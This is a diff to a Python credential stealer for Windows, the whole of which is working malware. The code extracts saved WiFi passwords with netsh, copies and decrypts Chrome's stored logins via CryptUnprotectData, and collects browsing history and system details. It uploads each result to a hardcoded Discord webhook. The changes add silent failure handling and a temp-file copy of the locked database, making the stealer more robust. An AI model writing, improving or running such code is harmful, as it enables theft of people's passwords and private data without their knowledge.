@@ -7,14 +7,19 @@ import uuid
 import requests
 import json
 import win32crypt
+import socket  # Missing import
+import sys     # Missing import
 from collections import OrderedDict
 
 # DISCORD WEBHOOK
 WEBHOOK_URL = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"
 
 def send_to_discord(filename, content):
-    files = {'file': (filename, content)}
-    requests.post(WEBHOOK_URL, files=files)
+    try:
+        files = {'file': (filename, content)}
+        requests.post(WEBHOOK_URL, files=files)
+    except Exception as e:
+        pass  # Silent failure
 
 def get_system_info():
     info = f"""
@@ -25,65 +30,102 @@ def get_system_info():
     Machine: {platform.machine()}
     Processor: {platform.processor()}
     OS: {platform.system()}
+    Release: {platform.release()}
+    Version: {platform.version()}
     """
     return info
 
-# --- WiFi PASSWORDS ---
 def extract_wifi():
     def get_wlans():
-        data = os.popen("netsh wlan show profiles").read()
-        wifi = re.compile("All User Profile\s*:.(.*)")
-        return wifi.findall(data)
+        try:
+            data = os.popen("netsh wlan show profiles").read()
+            return re.findall(r"All User Profile\s*:\s(.*)", data)
+        except:
+            return []
 
     def get_pass(network):
         try:
-            cmd = f"netsh wlan show profile \"{network}\" key=clear"
+            cmd = f'netsh wlan show profile name="{network}" key=clear'
             wlan = os.popen(cmd).read()
-            pass_regex = re.compile("Key Content\s*:.(.*)")
-            return pass_regex.search(wlan).group(1).strip()
+            match = re.search(r"Key Content\s*:\s(.*)", wlan)
+            return match.group(1).strip() if match else "N/A"
         except:
             return "N/A"
 
     wifi_data = ""
     for wlan in get_wlans():
         wifi_data += f"SSID: {wlan}\nPassword: {get_pass(wlan)}\n---\n"
-    send_to_discord("wifi.txt", wifi_data)
+    if wifi_data:
+        send_to_discord("wifi.txt", wifi_data)
 
-# --- CHROME PASSWORDS ---
 def extract_chrome_passwords():
-    data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
-    conn = sqlite3.connect(data_path)
-    cursor = conn.cursor()
-    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    passwords = ""
-    for site, user, encrypted_pass in cursor.fetchall():
-        decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1]
-        passwords += f"URL: {site}\nUser: {user}\nPass: {decrypted}\n---\n"
-    send_to_discord("chrome_passwords.txt", passwords)
+    try:
+        data_path = os.path.join(os.getenv('LOCALAPPDATA'), 
+                               'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
+        if not os.path.exists(data_path):
+            return
 
-# --- CHROME HISTORY ---
+        # Create temporary copy to avoid locking issues
+        temp_path = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
+        open(temp_path, 'a').close()  # Create empty file if doesn't exist
+        with open(data_path, 'rb') as f1, open(temp_path, 'wb') as f2:
+            f2.write(f1.read())
+
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        
+        passwords = ""
+        for site, user, encrypted_pass in cursor.fetchall():
+            try:
+                decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1]
+                passwords += f"URL: {site}\nUser: {user}\nPass: {decrypted.decode('utf-8')}\n---\n"
+            except:
+                continue
+                
+        if passwords:
+            send_to_discord("chrome_passwords.txt", passwords)
+            
+    except Exception as e:
+        pass
+    finally:
+        if 'temp_path' in locals() and os.path.exists(temp_path):
+            os.remove(temp_path)
+
 def extract_chrome_history():
-    def parse(url):
-        try:
-            domain = url.split('//')[1].split('/', 1)[0].replace("www.", "")
-            return domain
-        except:
-            return "N/A"
+    try:
+        history_db = os.path.join(os.getenv('LOCALAPPDATA'), 
+                                'Google', 'Chrome', 'User Data', 'Default', 'history')
+        if not os.path.exists(history_db):
+            return
 
-    history_db = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
-    conn = sqlite3.connect(history_db)
-    cursor = conn.cursor()
-    cursor.execute("SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url")
-    history = OrderedDict()
-    for url, count in cursor.fetchall():
-        domain = parse(url)
-        history[domain] = history.get(domain, 0) + count
-    sorted_history = "\n".join([f"{site}: {visits}" for site, visits in sorted(history.items(), key=lambda x: x[1], reverse=True)])
-    send_to_discord("chrome_history.txt", sorted_history)
+        def parse(url):
+            try:
+                return url.split('//')[1].split('/')[0].replace("www.", "")
+            except:
+                return url[:50]  # Return first 50 chars if parsing fails
 
-# --- EXECUTE ---
+        conn = sqlite3.connect(history_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100")
+        
+        history = OrderedDict()
+        for url, count in cursor.fetchall():
+            domain = parse(url)
+            history[domain] = history.get(domain, 0) + count
+            
+        if history:
+            sorted_history = "\n".join(f"{site}: {visits}" for site, visits in history.items())
+            send_to_discord("chrome_history.txt", sorted_history)
+            
+    except Exception as e:
+        pass
+
 if __name__ == "__main__":
-    extract_wifi()
-    extract_chrome_passwords()
-    extract_chrome_history()
-    send_to_discord("system_info.txt", get_system_info())
+    try:
+        extract_wifi()
+        extract_chrome_passwords()
+        extract_chrome_history()
+        send_to_discord("system_info.txt", get_system_info())
+    except:
+        pass
